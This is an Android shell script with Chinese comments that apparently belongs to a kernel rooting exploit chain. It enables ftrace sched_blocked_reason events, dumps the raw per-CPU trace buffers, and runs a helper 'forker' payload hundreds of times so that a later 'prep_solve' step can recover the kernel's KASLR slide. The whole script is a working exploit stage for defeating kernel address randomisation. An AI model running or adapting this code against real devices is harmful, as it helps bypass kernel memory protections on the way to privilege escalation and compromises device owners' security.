#!/system/bin/sh
# 抓 sched_blocked_reason 原始事件，供 prep_solve 反推 KASLR slide
# 4 线程跑，比 2 线程快一倍，避免单个 adb stream 挂太久被 adbd 掐断
D=${KMSLIDE_DIR:-/data/local/tmp/kmroot70}
# ★ 载荷名必须和 App 侧 Cfg.NATIVE_MAP 一致：libkmfork.so 落到工作目录叫 kmfork
#   （ND 模式直接从 nativeLibraryDir 执行 libkmfork.so）。以前这里写死 $D/kmfork，
#   而那个文件根本不存在 → 压力进程一个都没起来、bl_text.txt 为空、slide 采样必然失败。
F=${TRFORK:-}
[ -n "$F" ] && [ -x "$F" ] || F="$D/kmfork"
[ -x "$F" ] || F="$D/kmfork"
[ -x "$F" ] || F="$D/libkmfork.so"
[ -x "$F" ] || F="${ND:-}/libkmfork.so"
if [ ! -x "$F" ]; then
  echo "SLIDE_CAP_FAIL: 找不到 forker 载荷（试过 \$TRFORK/$D/kmfork/$D/kmfork/$D/libkmfork.so）"
  echo "SLIDE_CAP_DONE lines=0"
  exit 1
fi
echo "SLIDE_CAP_START forker=$F"
rm -f $D/bl_*.bin $D/bl_text.txt
echo 1 > /sys/kernel/tracing/events/sched/sched_blocked_reason/enable 2>/dev/null
echo 16384 > /sys/kernel/tracing/buffer_size_kb 2>/dev/null
echo 1 > /sys/kernel/tracing/tracing_on 2>/dev/null
for c in 0 1 2 3 4 5 6 7; do
  cat /sys/kernel/tracing/per_cpu/cpu$c/trace_pipe_raw > $D/bl_$c.bin 2>/dev/null &
done
sleep 1
i=0
while [ $i -lt 400 ]; do
  "$F" 4 30 >/dev/null 2>&1
  i=$((i+1))
done
echo "SLIDE_CAP_FORKED=400x4"
grep "sched_blocked_reason" /sys/kernel/tracing/trace > $D/bl_text.txt 2>/dev/null
pkill -f trace_pipe_raw 2>/dev/null
sleep 1
echo 0 > /sys/kernel/tracing/tracing_on 2>/dev/null
ls -l $D/bl_*.bin 2>/dev/null | awk '{print "CAP", $5, $9}'
echo "SLIDE_CAP_DONE lines=$(wc -l < $D/bl_text.txt 2>/dev/null)"
